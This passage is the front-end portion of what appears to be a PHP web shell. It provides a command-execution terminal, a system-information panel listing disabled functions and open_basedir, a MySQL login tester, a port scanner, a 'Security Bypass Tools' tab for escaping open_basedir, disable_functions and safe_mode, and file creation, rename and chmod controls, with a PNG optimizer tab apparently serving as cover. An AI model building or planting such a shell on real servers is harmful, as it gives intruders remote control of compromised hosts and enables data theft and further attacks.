            <div class="terminal-prompt"><strong>CWD:</strong> <?= htmlspecialchars($termCwdDisplay) ?> (use 'cd' persistent)</div>
            <div class="terminal-output"><?= htmlspecialchars($commandOutput) ?></div>
            <form method="post" class="terminal-input"><input type="text" name="command" placeholder="Command... e.g. ls -la, whoami" autofocus><button type="submit" class="btn">Execute</button></form>
        </div>
    </div>

    <!-- System Info Tab -->
    <div class="tab-content <?= $activeTab==='info'?'active':'' ?>" id="info">
        <div class="info-grid">
            <div class="info-card"><h3>🖥️ System</h3><div class="info-item"><span>OS</span><span><?= htmlspecialchars($systemInfo['os']) ?></span></div><div class="info-item"><span>Hostname</span><span><?= htmlspecialchars($systemInfo['hostname']) ?></span></div><div class="info-item"><span>User</span><span><?= htmlspecialchars($systemInfo['user']) ?></span></div></div>
            <div class="info-card"><h3>🐘 PHP</h3><div class="info-item"><span>Version</span><span><?= htmlspecialchars($systemInfo['php_version']) ?></span></div><div class="info-item"><span>Disabled funcs</span><span><?= htmlspecialchars($systemInfo['disable_functions']) ?></span></div><div class="info-item"><span>open_basedir</span><span><?= htmlspecialchars($systemInfo['open_basedir']) ?></span></div></div>
            <div class="info-card"><h3>💾 Disk</h3><div class="info-item"><span>Total</span><span><?= $systemInfo['disk_total'] ?? 'N/A' ?></span></div><div class="info-item"><span>Free</span><span><?= $systemInfo['disk_free'] ?? 'N/A' ?></span></div><div class="progress-bar" style="background:#222;height:8px;"><div class="progress-fill" style="width:<?= $systemInfo['disk_percent'] ?? '0' ?>;background:#0ff;height:8px;"></div></div></div>
        </div>
    </div>

    <!-- Database Tab -->
    <div class="tab-content <?= $activeTab==='database'?'active':'' ?>" id="database">
        <h3 style="margin-bottom:15px">MySQL Connection Test</h3>
        <form method="post"><div class="tool-group" style="margin-bottom:10px"><label>Host:</label><input type="text" name="db_host" value="localhost"></div><div class="tool-group" style="margin-bottom:10px"><label>User:</label><input type="text" name="db_user"></div><div class="tool-group" style="margin-bottom:10px"><label>Password:</label><input type="password" name="db_pass"></div><div class="tool-group" style="margin-bottom:10px"><label>DB Name:</label><input type="text" name="db_name"></div><button type="submit" class="btn btn-success">Connect</button></form>
    </div>

    <!-- Network Tab -->
    <div class="tab-content <?= $activeTab==='network'?'active':'' ?>" id="network">
        <h3>Port Scanner</h3>
        <form method="post"><div class="tool-group"><label>Host:</label><input type="text" name="scan_host" value="127.0.0.1"></div><div class="tool-group"><label>Start Port:</label><input type="number" name="scan_port_start" value="1"></div><div class="tool-group"><label>End Port:</label><input type="number" name="scan_port_end" value="1000"></div><button type="submit" class="btn">Scan</button></form>
    </div>

    <!-- Bypass Tab -->
    <div class="tab-content <?= $activeTab==='bypass'?'active':'' ?>" id="bypass">
        <h3>Security Bypass Tools</h3>
        <div class="tools"><a href="?tab=bypass&bypass=open_basedir" class="btn">Bypass open_basedir</a><a href="?tab=bypass&bypass=disable_functions" class="btn">Bypass disable_functions</a><a href="?tab=bypass&bypass=safe_mode" class="btn">Bypass safe_mode</a></div>
    </div>

    <!-- PNG Tools Tab -->
    <div class="tab-content <?= $activeTab==='pngtools'?'active':'' ?>" id="pngtools">
        <h3 style="margin-bottom:20px">🖼️ PNG Optimizer (lossless, max compression)</h3>
        <p>Select a PNG file from current directory to compress:</p>
        <form method="post">
            <div class="tool-group"><label>PNG File:</label>
            <select name="optimize_png_file">
                <option value="">-- choose PNG --</option>
                <?php foreach($pngFiles as $png): ?>
                <option value="<?= htmlspecialchars($png) ?>"><?= htmlspecialchars($png) ?></option>
                <?php endforeach; ?>
            </select></div>
            <button type="submit" class="btn btn-success">Optimize PNG</button>
        </form>
        <?php if(isset($_GET['optimize_single'])): 
            $single = $currentPath . basename($_GET['optimize_single']);
            if(is_file($single) && strtolower(pathinfo($single, PATHINFO_EXTENSION))==='png') {
                $res = optimizePNG($single, 9);
                if($res) echo "<p class='notification success'>Optimized: saved ".round($res['saved']/1024,2)." KB</p>";
                else echo "<p class='notification error'>Optimization failed</p>";
            } else echo "<p class='notification error'>Invalid PNG</p>";
        endif; ?>
    </div>
</div>

<!-- Modals & Scripts -->
<div id="newFileModal" class="modal"><div class="modal-content"><div class="modal-header">Create File</div><form method="post"><div class="modal-body"><input type="text" name="newfile" placeholder="filename.php"><textarea name="filecontent" placeholder="Content"></textarea></div><div class="modal-footer"><button type="submit" class="btn btn-success">Create</button><button type="button" class="btn btn-danger" onclick="closeModal('newFileModal')">Cancel</button></div></form></div></div>
<div id="newFolderModal" class="modal"><div class="modal-content"><div class="modal-header">Create Folder</div><form method="post"><div class="modal-body"><input type="text" name="newfolder" placeholder="Folder name"></div><div class="modal-footer"><button type="submit" class="btn btn-success">Create</button><button type="button" class="btn btn-danger" onclick="closeModal('newFolderModal')">Cancel</button></div></form></div></div>
<script>
function switchTab(tabName){ document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active')); document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active')); document.getElementById(tabName).classList.add('active'); document.querySelector(`.tab[onclick*="switchTab('${tabName}')"]`).classList.add('active'); }
function showNewFileModal(){ document.getElementById('newFileModal').classList.add('active'); }
function showNewFolderModal(){ document.getElementById('newFolderModal').classList.add('active'); }
function closeModal(id){ document.getElementById(id).classList.remove('active'); }
function renameItem(oldName){ let newName=prompt('New name:',oldName); if(newName && newName!==oldName){ let f=document.createElement('form');f.method='post';f.innerHTML='<input type="hidden" name="oldname" value="'+oldName+'"><input type="hidden" name="newname" value="'+newName+'">';document.body.appendChild(f);f.submit();} }
function chmodItem(item){ let mode=prompt('Permissions (octal):','755'); if(mode){ let f=document.createElement('form');f.method='post';f.innerHTML='<input type="hidden" name="chmod_item" value="'+item+'"><input type="hidden" name="chmod_value" value="'+mode+'">';document.body.appendChild(f);f.submit();} }
setTimeout(()=>{document.querySelectorAll('.notification').forEach(n=>{n.style.opacity='0';setTimeout(()=>n.style.display='none',300);});},3000);
document.querySelectorAll('.modal').forEach(m=>{m.addEventListener('click',e=>{if(e.target===m)m.classList.remove('active');});});
if(document.querySelector('#terminal.active')) document.querySelector('.terminal-input input')?.focus();
</script>
</body>
</html>